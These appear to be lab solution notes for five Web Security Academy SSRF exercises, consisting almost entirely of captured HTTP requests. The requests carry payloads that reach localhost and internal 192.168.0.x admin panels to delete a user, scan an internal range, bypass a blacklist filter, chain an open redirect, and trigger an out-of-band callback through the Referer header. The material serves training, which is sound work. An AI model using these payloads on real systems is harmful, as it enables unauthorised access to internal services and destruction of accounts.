## 1. Basic SSRF against the local server

```
POST /product/stock HTTP/2
Host: 0a43002e03650fac88366f5700e6003a.web-security-academy.net
Cookie: session=fZPGORMlQ9jZRS9FtHvI28uBjYeDwu3L
Content-Length: 62
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a43002e03650fac88366f5700e6003a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a43002e03650fac88366f5700e6003a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos
```


## 2. Basic SSRF against another back-end system

Intruder

```
POST /product/stock HTTP/2
Host: 0a72009f03fb4d628398acdf0099007d.web-security-academy.net
Cookie: session=kElSbrVa2mSwulJIi2d1N7Kr83XjjUFy
Content-Length: 48
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a72009f03fb4d628398acdf0099007d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a72009f03fb4d628398acdf0099007d.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

stockApi=http%3A%2F%2F192.168.0.§1§%3A8080%2Fadmin
```

Repeater
```
POST /product/stock HTTP/2
Host: 0a72009f03fb4d628398acdf0099007d.web-security-academy.net
Cookie: session=kElSbrVa2mSwulJIi2d1N7Kr83XjjUFy
Content-Length: 63
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a72009f03fb4d628398acdf0099007d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a72009f03fb4d628398acdf0099007d.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

stockApi=http://192.168.0.214:8080/admin/delete?username=carlos
```

## 3. Blind SSRF with out-of-band detection

```
GET /product?productId=20 HTTP/2
Host: 0a1e00520492ef9a815a6c0500c100e0.web-security-academy.net
Cookie: session=i6OPsjxmm6LtQOZ7LEHr40vQ8iLMi5N2
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://akyogqwrbcx2fhz3ut4fk2oy3p9gx9ly.oastify.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i


```

## 4. SSRF with blacklist-based input filter

```
POST /product/stock HTTP/2
Host: 0ad900a504fbb4138264adad00b30021.web-security-academy.net
Cookie: session=BXVhxrEvMEVroe3wgvwboz5lEGJvFQ4e
Content-Length: 56
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0ad900a504fbb4138264adad00b30021.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad900a504fbb4138264adad00b30021.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

stockApi=http%3a%2f%2f127.1/Admin/delete?username=carlos
```

## 5. SSRF with filter bypass via open redirection vulnerability

```
POST /product/stock HTTP/2
Host: 0a4d003903b840a080aaee0f00c90025.web-security-academy.net
Cookie: session=vSRAngaMpdkjNGd4hNdizAQjVnnzgJy4
Content-Length: 129
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a4d003903b840a080aaee0f00c90025.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4d003903b840a080aaee0f00c90025.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d8%26path%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin/delete?username=carlos
```
